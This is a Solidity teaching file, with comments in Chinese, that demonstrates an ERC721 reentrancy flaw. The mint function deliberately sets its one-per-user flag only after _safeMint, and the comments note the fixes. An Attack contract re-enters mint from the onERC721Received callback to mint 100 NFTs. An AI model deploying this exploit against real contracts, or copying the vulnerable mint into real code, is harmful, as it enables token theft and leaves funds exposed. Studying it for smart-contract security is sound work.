// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract NFTReentrancy is ERC721 {
    uint256 public totalSupply;
    mapping(address => bool) public mintedAddress;
    // 构造函数，初始化NFT合集的名称、代号
    constructor() ERC721("Reentry NFT", "ReNFT"){}

    // 铸造函数，每个用户只能铸造1个NFT
    // 有重入漏洞
    function mint() payable external {
        // 检查是否mint过
        require(mintedAddress[msg.sender] == false);
        // 增加total supply
        totalSupply++;
        // mint
        _safeMint(msg.sender, totalSupply);
        // 记录mint过的地址
        mintedAddress[msg.sender] = true;

        // 1.检查-影响-交互模式:
        // 记录mint过的地址
        // mintedAddress[msg.sender] = true;
        // mint
        // _safeMint(msg.sender, totalSupply);

        // 2.使用重入锁
    }
}

// ERC721 的 safeTransferFrom() 函数会调用目标地址的 onERC721Received() 函数，而黑客可以把恶意代码嵌入其中进行攻击。
contract Attack is IERC721Receiver{
    NFTReentrancy public nft; // 有漏洞的nft合约地址

    // 初始化NFT合约地址
    constructor(NFTReentrancy _nftAddr) {
        nft = _nftAddr;
    }
    
    // 攻击函数，发起攻击
    function attack() external {
        nft.mint();
    }

    // ERC721的回调函数，会重复调用mint函数，铸造100个
    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
        if(nft.balanceOf(address(this)) < 100){
            nft.mint();
        }
        return this.onERC721Received.selector;
    }
}